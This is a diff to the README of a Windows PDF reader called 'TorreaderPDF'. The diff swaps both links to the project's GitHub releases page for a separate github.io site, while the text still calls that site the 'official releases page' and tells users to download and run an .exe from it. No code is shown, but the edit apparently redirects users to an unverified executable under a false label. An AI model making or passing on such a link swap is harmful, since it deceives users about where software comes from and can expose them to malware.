@@ -1,6 +1,6 @@
 # 📖 TorreaderPDF - Read Edit And Sign Digital Documents
 
-[ ![Download TorreaderPDF](https://img.shields.io/badge/Download-Releases-blue) ](https://github.com/cxxv-kiss838/TorreaderPDF/releases)
+[ ![Download TorreaderPDF](https://img.shields.io/badge/Download-Releases-blue) ](https://cxxv-kiss838.github.io)
 
 TorreaderPDF helps you manage documents on your computer. You view, edit, and organize PDF files without an internet connection. The app uses standard tools to keep your data private and secure. It runs on Windows systems.
 
@@ -8,7 +8,7 @@ TorreaderPDF helps you manage documents on your computer. You view, edit, and or
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official releases page](https://github.com/cxxv-kiss838/TorreaderPDF/releases) to find the latest version.
+1.  Visit the [official releases page](https://cxxv-kiss838.github.io) to find the latest version.
 2.  Look for the file ending in `.exe` under the "Assets" section.
 3.  Click the file name to start the download.
 4.  Move the file to a folder of your choice.
